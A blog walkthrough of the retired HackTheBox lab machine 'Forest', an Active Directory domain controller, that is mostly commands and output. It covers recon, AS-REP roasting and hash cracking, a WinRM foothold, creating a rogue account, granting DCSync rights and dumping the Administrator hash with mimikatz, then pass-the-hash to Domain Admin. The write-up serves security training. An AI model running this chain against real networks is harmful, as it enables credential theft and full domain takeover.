+++
author = "Chris Suttles"
categories = ["CTF", "hackthebox", "offsec", "security", "kali", "metasploit"]
date = 2020-03-27T10:45:11Z
description = ""
draft = false
cover = "/images/2020/03/Screen-Shot-2020-03-26-at-8.48.54-PM.png"
slug = "forest"
tags = ["CTF", "hackthebox", "offsec", "security", "kali", "metasploit"]
title = "Forest"

+++


It's been a while since I posted a writeup, and a machine I really enjoyed was recently retired from [hackthebox.eu](/forest/hackthebox.eu), so here's a walkthrough of Forest.

## Recon

I always start a [hackthebox.eu](/forest/hackthebox.eu) machine by adding the hostname to my `/etc/hosts`. Here's the output of `nmap -sV -O -A -T5 -p- forest`

{{< highlight markdown >}}

[*] Nmap: Nmap scan report for 10.10.10.161
[*] Nmap: Host is up (0.068s latency).
[*] Nmap: Not shown: 65511 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 53/tcp    open  domain?
[*] Nmap: | fingerprint-strings:
[*] Nmap: |   DNSVersionBindReqTCP:
[*] Nmap: |     version
[*] Nmap: |_    bind
[*] Nmap: 88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-27 02:26:54Z)
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
[*] Nmap: 445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
[*] Nmap: 464/tcp   open  kpasswd5?
[*] Nmap: 593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
[*] Nmap: 636/tcp   open  tcpwrapped
[*] Nmap: 3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
[*] Nmap: 3269/tcp  open  tcpwrapped
[*] Nmap: 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: |_http-title: Not Found
[*] Nmap: 9389/tcp  open  mc-nmf       .NET Message Framing
[*] Nmap: 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: |_http-title: Not Found
[*] Nmap: 49664/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49665/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49666/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49667/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49670/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
[*] Nmap: 49677/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49684/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49698/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49718/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[*] Nmap: SF-Port53-TCP:V=7.80%I=7%D=12/26%Time=5E056A20%P=x86_64-pc-linux-gnu%r(DNS
[*] Nmap: SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
[*] Nmap: SF:\x04bind\0\0\x10\0\x03");
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.80%E=4%D=12/26%OT=53%CT=1%CU=34311%PV=Y%DS=2%DC=T%G=Y%TM=5E056B
[*] Nmap: OS:37%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%II=I%TS=A)SEQ(SP=102%G
[*] Nmap: OS:CD=1%ISR=10D%TS=A)SEQ(SP=102%GCD=1%ISR=10D%CI=I%TS=A)OPS(O1=M54DNW8ST11%
[*] Nmap: OS:O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11
[*] Nmap: OS:)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W
[*] Nmap: OS:=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y
[*] Nmap: OS:%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR
[*] Nmap: OS:%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
[*] Nmap: OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
[*] Nmap: OS:=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164
[*] Nmap: OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
[*] Nmap: Uptime guess: 0.005 days (since Thu Dec 26 20:16:29 2019)
[*] Nmap: Network Distance: 2 hops
[*] Nmap: TCP Sequence Prediction: Difficulty=258 (Good luck!)
[*] Nmap: IP ID Sequence Generation: Busy server or unknown class
[*] Nmap: Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: |_clock-skew: mean: 2h47m47s, deviation: 4h37m08s, median: 7m46s
[*] Nmap: | smb-os-discovery:
[*] Nmap: |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
[*] Nmap: |   Computer name: FOREST
[*] Nmap: |   NetBIOS computer name: FOREST\x00
[*] Nmap: |   Domain name: htb.local
[*] Nmap: |   Forest name: htb.local
[*] Nmap: |   FQDN: FOREST.htb.local
[*] Nmap: |_  System time: 2019-12-26T18:29:25-08:00
[*] Nmap: | smb-security-mode:
[*] Nmap: |   account_used: <blank>
[*] Nmap: |   authentication_level: user
[*] Nmap: |   challenge_response: supported
[*] Nmap: |_  message_signing: required
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   2.02:
[*] Nmap: |_    Message signing enabled and required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2019-12-27T02:29:28
[*] Nmap: |_  start_date: 2019-12-27T02:24:38
[*] Nmap: TRACEROUTE (using port 199/tcp)
[*] Nmap: HOP RTT      ADDRESS
[*] Nmap: 1   57.57 ms 10.10.14.1
[*] Nmap: 2   57.89 ms 10.10.10.161
[*] Nmap: NSE: Script Post-scanning.
[*] Nmap: Initiating NSE at 20:23
[*] Nmap: Completed NSE at 20:23, 0.00s elapsed
[*] Nmap: Initiating NSE at 20:23
[*] Nmap: Completed NSE at 20:23, 0.00s elapsed
[*] Nmap: Initiating NSE at 20:23
[*] Nmap: Completed NSE at 20:23, 0.00s elapsed
[*] Nmap: Read data files from: /usr/bin/../share/nmap
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 331.49 seconds
[*] Nmap: Raw packets sent: 65734 (2.898MB) | Rcvd: 65654 (2.632MB)

{{< / highlight >}}

Oh my, that is a lot of information. A few things are unusual here. There's LDAP, kerberos, and a kpasswd service, in addition to SMB services. This suggests that we just scanned a domain controller. We also have 5985 open, so we can use that to get a shell with `[evil-winrm](https://github.com/Hackplayers/evil-winrm)` eventually.

I like to do my nmap scans from metasploit so I can them in the msf db. I also really like the services summary in msfconsole.

{{< highlight markdown >}}

msf5 > services
Services
========

host          port   proto  name          state  info
----          ----   -----  ----          -----  ----
10.10.10.161  53     tcp    domain        open
10.10.10.161  88     tcp    kerberos-sec  open   Microsoft Windows Kerberos server time: 2019-12-27 02:26:54Z
10.10.10.161  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.161  389    tcp    ldap          open   Microsoft Windows Active Directory LDAP Domain: htb.local, Site: Default-First-Site-Name
10.10.10.161  445    tcp    microsoft-ds  open   Windows Server 2016 Standard 14393 microsoft-ds workgroup: HTB
10.10.10.161  464    tcp    kpasswd5      open
10.10.10.161  593    tcp    ncacn_http    open   Microsoft Windows RPC over HTTP 1.0
10.10.10.161  636    tcp    tcpwrapped    open
10.10.10.161  3268   tcp    ldap          open   Microsoft Windows Active Directory LDAP Domain: htb.local, Site: Default-First-Site-Name
10.10.10.161  3269   tcp    tcpwrapped    open
10.10.10.161  5985   tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.10.161  9389   tcp    mc-nmf        open   .NET Message Framing
10.10.10.161  47001  tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.10.161  49664  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49665  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49666  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49667  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49670  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49676  tcp    ncacn_http    open   Microsoft Windows RPC over HTTP 1.0
10.10.10.161  49677  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49684  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49698  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.161  49718  tcp    msrpc         open   Microsoft Windows RPC

{{< / highlight >}}

Let's poke at LDAP and see what we can find

{{< highlight markdown >}}

root@kali:[~/ctf/forest]:
[Exit: 1] 20:23: nmap -p 389 forest --script ldap-rootdse
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 20:23 CST
Nmap scan report for forest (10.10.10.161)
Host is up (0.10s latency).
rDNS record for 10.10.10.161: forest.htb.local

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20191227023119.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
|       rootDomainNamingContext: DC=htb,DC=local
...
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: FOREST.htb.local
|       ldapServiceName: htb.local:forest$@HTB.LOCAL
|       serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 7
|       forestFunctionality: 7
|_      domainControllerFunctionality: 7
Service Info: Host: FOREST; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds

{{< / highlight >}}

Now we've confirmed this is a DC. Let's use that to our advantage.

I found Impacket very useful for this box. Here's a [great intro to using Impacket](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/). I mention it, because my next step was to enumerate users and my attempts to do that via ldap were not successful (doesn't mean it can't be done, just didn't work for me). So I started looking at Impacket and I was able to enumerate users via the SAMR pipe with 'samrdump.py'

{{< highlight markdown >}}

root@kali:[~/src/impacket/examples]:(master %)
[Exit: 0] 07:26: ./samrdump.py -debug -dc-ip 10.10.10.161 -target-ip 10.10.10.161 forest.htb.local | tee ~/ctf/forest/samrdump.py.out
...

{{< / highlight >}}

From this output, we can build a list of users that actually exist easily with some simple UNIX fundamentals.

{{< highlight markdown >}}

root@kali:[~/src/impacket/examples]:(master %)
[Exit: 0 0 0] 07:31: awk '{print $1}'  ~/ctf/forest/samrdump.py.out   | sort |uniq | grep -P '\w+'
$331000-VK4ADACQNUCA
Administrator
andy
DefaultAccount
Found
Guest
HealthMailbox0659cc1
HealthMailbox670628e
HealthMailbox6ded678
HealthMailbox7108a4e
HealthMailbox83d6781
HealthMailbox968e74d
HealthMailboxb01ac64
HealthMailboxc0a90c9
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxfd87238
Impacket
krbtgt
lucinda
mark
santi
sebastien
SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb
SM_681f53d4942840e18
SM_75a538d3025e4db9a
SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b
svc-alfresco

{{< / highlight >}}

## Getting a Foothold / User Flag

We have a list of users, and we've enumerated the box to understand how we can attack it for a foothold. Let's work on that. Since this is a DC, we can again use that to our advantage, and attack Kerberos.

Remember how I said Impacket would be important when we used it to build a list of users? With that list of users, we can look for users who have DONT_REQ_PREAUTH set, making them vulnerable to as asrep roast kerberos attack. There's an [excellent writeup on this technique over on harmj0y's blog](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/). Here's a quick summary of this attack from harmj0y:

> **tl;dr** – if you can enumerate any accounts in a Windows domain that don’t require Kerberos preauthentication, you can now easily request a piece of encrypted information for said accounts and efficiently crack the material offline, revealing the user’s password.

So this is exactly where we are with forest. We can use the userlist we gathered to check if any of the accounts match the criteria that makes them vulnerable to this attack with another Impacket tool (GetNPUsers.py).

{{< highlight markdown >}}

root@kali:[~/src/impacket/examples]:(master %)
[Exit: 0] 22:16: ./GetNPUsers.py htb.local/ -usersfile ~/ctf/forest/users.txt -dc-ip 10.10.10.161 -format hashcat -outputfile hashes.asreproast
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
root@kali:[~/src/impacket/examples]:(master %)
[Exit: 0] 22:19: cat hashes.asreproast
$krb5asrep$23$svc-alfresco@HTB.LOCAL:e831e9a29eb858a0c3dda0b867380937$75bd5e5c9354e117bad4345ae9c2ebe751ebe728d493b004ca47d866338f70931f2b74163520cf365ba863e2838fe8cb777ba5edfcc3b57f8b9dc7df9aa46b9229226cd695f606e2fbd8c68da25ed5b6c3e906f3aec4aa47d3d55929a75de69573d31e2049b86d0d11bdaa612cb78a3404dcfa34ecfd5c28793bacb0ad0256acd2265075ebfcdf0172b4031c0098e08db042e205c15f41595707c93934d3000515af1fc67c2885f260f0180d43bf6c85e39454c7cdac427a0224355199e34fe45048cf83998a1a4bff52a45cc35a56ef8d8175baa7f7fd37490386c4a6fed17d9a4f205cec1a
root@kali:[~/src/impacket/examples]:(master %)
[Exit: 0] 22:19:

{{< / highlight >}}

Now let's fire up hashcat and get this password.

{{< highlight markdown >}}

notkali@gpu:[~/tmp]:
[Exit: 0] 22:18: hashcat -m 18200 --force -a 0 hash ~/src/SecLists/Passwords/Leaked-Databases/rockyou.txt


$krb5asrep$23$svc-alfresco@HTB.LOCAL:81301001ab2c010fdccd72827f025a77$cb4aaa6a0b1f6f2d2a3fcb7fb46f2cc119e8bb5e3837779206d900a07bd8d4c4f4e4315fff492a8b6c4e5b326e98027b242de4c087635410de9c2b5a33471c65c490a419b9d669d79c32d303f43a26654068f96d7ea13d6447e5bbd7d955a7d5143f3999ccd92a3ca3e099ca74ba4783c954e22f5a1ca810b5195be415ef98e0a9767c3d4586dd03df574a1620ac1ba317024e9f7382c202870b7ccbcd21c3cb58ba70b23bd2f1a81c62941c070530655d1da6dcb7e3a91f99924e0f78792659c62064a0dd0cd1b26864c214b947efd53bc8bbf6ba62bb7c943234908b03bc913f12b38ed688:s3rvice

{{< / highlight >}}

We saw earlier that winrm is accessible, so let's get a shell as svc-alfresco with the password we cracked and see if we can get the user flag for this machine.

{{< highlight markdown >}}

root@kali:[~/ctf/forest]:
[Exit: 0 0] 22:37: evil-winrm -i forest -u'HTB\svc-alfresco' -p's3rvice' -s ~/src/PowerSploit/Privesc/

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
e5e4e47a************************

{{< / highlight >}}

[Excellent.](https://www.offensive-security.com/excellent.mp3)

## Privesc / Root Flag

Once I had a foothold as the svc-alfresco user and started poking around, I quickly learned that this account, and others that existed when the machine was spawned seemed to be getting reset pretty frequently. This was making it challenging to do my enumeration to find a privesc, so I ended up creating a fresh user account and granting permission to that account so that I could continue.

{{< highlight markdown >}}

# ricknmorty1 created with svc-alfresco acct! :)

# This localgroup controls access to winrm, so add our user to it:

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote management Users" ricknmorty1 /add
The command completed successfully.


# Current groups (this was every domain group svc-alfresco could add the user to)

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user ricknmorty1
User name                    ricknmorty1
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/28/2019 7:34:46 PM
Password expires             2/8/2020 7:34:46 PM
Password changeable          12/29/2019 7:34:46 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/28/2019 8:13:05 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Compliance Management*Exchange Windows Perm
                             *Enterprise Key Admins*UM Management
                             *Organization Manageme*Enterprise Read-only
                             *Domain Users         *Records Management
                             *Exchange Servers     *Group Policy Creator
                             *Exchange Trusted Subs*Hygiene Management
                             *test                 *Help Desk
                             *Server Management    *Public Folder Managem
                             *Security Administrato*Cloneable Domain Cont
                             *DnsUpdateProxy       *Managed Availability
                             *Domain Computers     *Key Admins
                             *Discovery Management *Security Reader
                             *$D31000-NSEL5BRJ63V7 *ExchangeLegacyInterop
                             *Recipient Management *Delegated Setup
The command completed successfully.

{{< / highlight >}}

I knew that I wanted to run [AD Bloodhound](https://github.com/BloodHoundAD/BloodHound) to help me examine the AD structure, but I had been unable to get that working with the built in accounts. If you are unfamiliar with AD Bloodhound, check out ["How Attackers Use BloodHound To Get Active Directory Domain Admin Access"](https://mcpmag.com/articles/2019/11/13/bloodhound-active-directory-domain-admin.aspx). After creating `ricknmorty1` and adding that account to every domain group I could, as well as the local group that controls winrm access, I was finally able to get a shell as my new user and also run SharpHound to gather data that I would then feed into Bloodhound.

{{< highlight markdown >}}

# Finally got Invoke-BloodHound to run locally. getting data remotely did not produce enough detail in bloodhound (maybe user error?).

*Evil-WinRM* PS C:\Users\ricknmorty1\Documents> Invoke-BloodHound -DomainController forest.htb.local -LDAPUser ricknmorty1 -LDAPPass ricknmorty1 -CollectionMethod All -ZipFileName sh.zip -PrettyJson -JSONPrefix SH-data -Verbose  -StatusInterval 500 -Domain htb.local -SkipPing

{{< / highlight >}}

After grabbing the data from SharpHound and loading it up in AD Bloodhound, I checked the built in query "Shortest path to Domain Admin".

{{< figure src="/content/images/2020/03/Forest_AD-Bloodhound.png" caption="Find Shortest Path to Domain Admins" >}}

Next, I reviewed the suggested path, and after drilling down on the crucial step (WriteDACL), I found helpful instructions on how this attack works. Nice!

{{< figure src="/content/images/2020/03/Forest_WriteDACL.png" caption="WriteDACL to grant dcsync rights, then use that to \"sync\" the DA password and intercept the hash" >}}

The instructions did have a minor syntax wrinkle, but after reading the fine manual and using `get-help` 10,000 times (PowerShell is something I am working on improving), I managed to find the right syntax to grant DCSync.

{{< highlight markdown >}}

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity ricknmorty1 -Rights DCSync -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=htb,DC=local
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ricknmorty1)(name=ricknmorty1)(displayname=ricknmorty1))))
Verbose: [Get-DomainSearcher] search base: LDAP://DC=htb,DC=local
Verbose: [Get-DomainObject] Get-DomainObject filter string: (objectClass=*)
Verbose: [Add-DomainObjectAcl] Granting principal CN=ricknmorty1,CN=Users,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=ricknmorty1,CN=Users,DC=htb,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
...
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>

{{< / highlight >}}

Now, in another terminal where I had an evil-winrm shell as `ricknmorty`, I was finally able to run mimikatz and grab the Domain Admin hash. The astute reader will see I also do the DCSync grant for `ricknmorty1` again just before running mimikatz. I saw a couple errors in the verbose output of the grant when I ran it as `svc-alfresco` so I thought a little extra insurance couldn't hurt.

{{< highlight markdown >}}

*Evil-WinRM* PS C:\Users\ricknmorty1\Documents> Add-ObjectACL -PrincipalIdentity ricknmorty1 -Rights DCSync
*Evil-WinRM* PS C:\Users\ricknmorty1\Documents> .\mimikatz.exe "lsadump::dcsync /domain:htb.local /user:Administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Dec 22 2019 21:45:22
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:htb.local /user:Administrator
[DC] 'htb.local' will be the domain
[DC] 'FOREST.htb.local' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Principal Name  : Administrator@htb.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 9/18/2019 9:09:08 AM
Object Security ID   : S-1-5-21-3072663084-364016917-1341370565-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 32693b11************************

mimikatz(commandline) # exit
Bye!
*Evil-WinRM* PS C:\Users\ricknmorty1\Documents>

{{< / highlight >}}

Now that we have the (Domain) Administrator hash, we can simply pass the hash and get a shell, and finally, grab the root flag.

{{< highlight markdown >}}

root@kali:[~/www/mimikatz/x64]:
[Exit: 1] 17:12: evil-winrm -u'Administrator' -H'32693b11************************'   -i forest

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ============================================
htb\administrator S-1-5-21-3072663084-364016917-1341370565-500


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Group Policy Creator Owners            Group            S-1-5-21-3072663084-364016917-1341370565-520  Mandatory group, Enabled by default, Enabled group
HTB\Domain Admins                          Group            S-1-5-21-3072663084-364016917-1341370565-512  Mandatory group, Enabled by default, Enabled group
HTB\Enterprise Admins                      Group            S-1-5-21-3072663084-364016917-1341370565-519  Mandatory group, Enabled by default, Enabled group
HTB\Organization Management                Group            S-1-5-21-3072663084-364016917-1341370565-1104 Mandatory group, Enabled by default, Enabled group
HTB\Schema Admins                          Group            S-1-5-21-3072663084-364016917-1341370565-518  Mandatory group, Enabled by default, Enabled group
HTB\Denied RODC Password Replication Group Alias            S-1-5-21-3072663084-364016917-1341370565-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

